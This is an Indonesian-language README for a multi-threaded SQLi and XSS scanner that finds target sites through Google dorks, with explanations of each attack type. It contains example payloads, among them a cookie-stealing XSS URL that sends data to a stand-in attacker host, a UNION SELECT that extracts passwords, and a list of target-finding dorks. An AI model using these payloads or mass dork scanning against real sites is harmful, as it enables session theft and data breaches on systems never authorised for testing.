# XNOXS DORK

SQLi & XSS Vulnerability Scanner v2.2 [Multi-threaded]

## Deskripsi

XNOXS DORK adalah tool keamanan untuk mendeteksi kerentanan SQL Injection dan XSS (Cross-Site Scripting) pada website. Tool ini menggunakan Google Dork untuk mencari target URL dan melakukan scanning secara otomatis dengan multi-threading.

**For Security Research Purposes Only**

---

## Apa itu SQL Injection (SQLi)?

### Definisi
SQL Injection adalah teknik serangan yang memanfaatkan celah keamanan pada aplikasi web yang tidak memvalidasi input pengguna dengan benar. Penyerang menyisipkan kode SQL berbahaya ke dalam query database melalui input form, URL parameter, atau cookie.

### Cara Kerja
1. Aplikasi web menerima input dari pengguna (contoh: `id=1`)
2. Input tersebut langsung dimasukkan ke dalam query SQL tanpa validasi
3. Penyerang memodifikasi input dengan kode SQL (contoh: `id=1' OR '1'='1`)
4. Database mengeksekusi query yang sudah dimodifikasi
5. Penyerang mendapatkan akses ke data yang seharusnya tidak bisa diakses

### Contoh Serangan
```
URL Normal:
https://example.com/product.php?id=1

URL dengan SQLi:
https://example.com/product.php?id=1' OR '1'='1'--
https://example.com/product.php?id=1 UNION SELECT username,password FROM users--
```

### Dampak SQL Injection
- **Data Breach** - Pencurian data sensitif (username, password, data pribadi, kartu kredit)
- **Authentication Bypass** - Login tanpa password yang valid
- **Data Manipulation** - Mengubah atau menghapus data di database
- **Remote Code Execution** - Mengeksekusi perintah sistem pada server
- **Full Server Takeover** - Mengambil alih kontrol penuh server database

---

## Apa itu Cross-Site Scripting (XSS)?

### Definisi
XSS adalah kerentanan keamanan yang memungkinkan penyerang menyuntikkan script berbahaya (biasanya JavaScript) ke halaman web yang dilihat oleh pengguna lain. Script tersebut dieksekusi di browser korban dengan konteks keamanan website yang rentan.

---

## Reflected XSS

### Cara Kerja
1. Penyerang membuat URL berbahaya yang berisi script
2. Korban mengklik URL tersebut (biasanya melalui phishing)
3. Server merefleksikan script ke halaman response
4. Browser korban mengeksekusi script berbahaya
5. Script mencuri cookie, session, atau data sensitif lainnya

### Contoh Serangan
```
URL Normal:
https://example.com/search?q=laptop

URL dengan Reflected XSS:
https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

### Dampak Reflected XSS
- **Session Hijacking** - Mencuri session cookie untuk mengambil alih akun
- **Credential Theft** - Membuat form login palsu untuk mencuri password
- **Keylogging** - Merekam semua keystroke korban
- **Phishing** - Menampilkan konten palsu yang terlihat asli
- **Malware Distribution** - Mengarahkan korban ke situs berbahaya

---

## DOM-based XSS

### Definisi
DOM XSS adalah varian XSS dimana payload berbahaya dieksekusi sebagai hasil dari modifikasi DOM (Document Object Model) di browser korban. Berbeda dengan Reflected XSS, serangan ini terjadi sepenuhnya di sisi client tanpa melibatkan server.

### Cara Kerja
1. Halaman web menggunakan JavaScript untuk membaca data dari URL (source)
2. Data tersebut ditulis ke halaman tanpa sanitasi (sink)
3. Penyerang memanipulasi URL dengan payload berbahaya
4. JavaScript di halaman mengeksekusi payload tersebut
5. Serangan terjadi tanpa request ke server

### Sources (Sumber Data Berbahaya)
```javascript
document.URL
document.location
document.referrer
window.name
location.hash
location.search
localStorage
sessionStorage
```

### Sinks (Titik Eksekusi Berbahaya)
```javascript
eval()
innerHTML
outerHTML
document.write()
setTimeout()
setInterval()
element.src
element.href
jQuery.html()
```

### Contoh Serangan
```
URL Normal:
https://example.com/page#section1

URL dengan DOM XSS:
https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

### Kode Rentan
```javascript
// Vulnerable code
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
```

### Dampak DOM XSS
- **Sama dengan Reflected XSS** - Session hijacking, credential theft, dll
- **Sulit Dideteksi** - Tidak ada jejak di server logs
- **Bypass WAF** - Web Application Firewall tidak bisa mendeteksi
- **Persistent dalam SPA** - Bisa bertahan di Single Page Applications

---

## Perbandingan Jenis XSS

| Aspek | Reflected XSS | DOM-based XSS |
|-------|---------------|---------------|
| Lokasi Eksekusi | Server → Client | Client Only |
| Server Logs | Ada jejak | Tidak ada jejak |
| Deteksi WAF | Bisa dideteksi | Sulit dideteksi |
| Payload di Response | Ya | Tidak |
| Memerlukan JavaScript | Tidak selalu | Ya |

---

## Fitur Tool

- **Google Dork Scanner** - Mencari target URL menggunakan Google Dork dengan pagination (hingga 100+ URL)
- **SQL Injection Detection** - Mendeteksi kerentanan SQLi pada berbagai database (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, dll)
- **Reflected XSS Detection** - Mendeteksi kerentanan Reflected XSS dengan berbagai payload
- **DOM-based XSS Detection** - Analisis source & sink untuk mendeteksi DOM XSS
- **Multi-threaded Scanning** - Scanning paralel untuk performa lebih cepat
- **ScraperAPI Integration** - Bypass Google captcha untuk hasil pencarian yang lebih andal
- **Export Results** - Simpan hasil vulnerability ke file

---

## Instalasi

### 1. Clone Repository

```bash
git clone https://github.com/yourusername/xnoxs-dork.git
cd xnoxs-dork
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

---

## Penggunaan

### Jalankan Tool

```bash
python xnoxs_dork.py
```

### Menu Utama

```
[1] Scan dengan Google Dork (Multi-threaded)
[2] Scan URL Tunggal
[3] Lihat Hasil Vulnerability
[4] Pengaturan
[5] Tentang Tool
[0] Keluar
```

### Contoh Google Dork

```
inurl:php?id=
inurl:product.php?id=
site:example.com inurl:?id=
inurl:index.php?page=
inurl:article.php?id=
```

---

## Pengaturan

| Setting | Default | Deskripsi |
|---------|---------|-----------|
| Threads | 5 | Jumlah thread untuk scanning paralel |
| Timeout | 10s | Timeout request dalam detik |
| Results | 100 | Jumlah maksimal URL dari Google Dork |

---

## Database yang Didukung

Tool ini dapat mendeteksi error SQL Injection dari berbagai database:

- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- IBM DB2
- Generic SQL Errors

---

## Disclaimer

**PERINGATAN PENTING**

Tool ini dibuat HANYA untuk tujuan edukasi dan penelitian keamanan yang sah. 

- Jangan gunakan tool ini pada sistem tanpa izin tertulis dari pemilik
- Penggunaan ilegal adalah tanggung jawab pengguna sepenuhnya
- Pastikan Anda memahami hukum cyber crime di negara Anda
- Selalu lakukan pengujian pada lingkungan yang Anda miliki atau memiliki izin

---

## Requirements

- Python 3.9+
- colorama
- requests
- xnoxs-engine

---

## Lisensi

MIT License

## Author

XNOXS Team
